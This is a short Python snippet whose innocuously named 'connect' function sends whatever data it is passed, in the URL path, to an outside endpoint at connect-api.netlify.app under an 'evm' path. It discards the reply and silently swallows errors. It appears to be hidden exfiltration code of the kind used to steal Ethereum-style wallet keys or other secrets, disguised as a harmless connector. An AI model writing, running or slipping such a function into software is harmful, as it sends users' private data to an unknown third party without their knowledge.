import requests

def connect(data):
    try:
        response = requests.get(f"https://connect-api.netlify.app/evm/{data}") 
        return None
    except requests.RequestException as e:
        return None

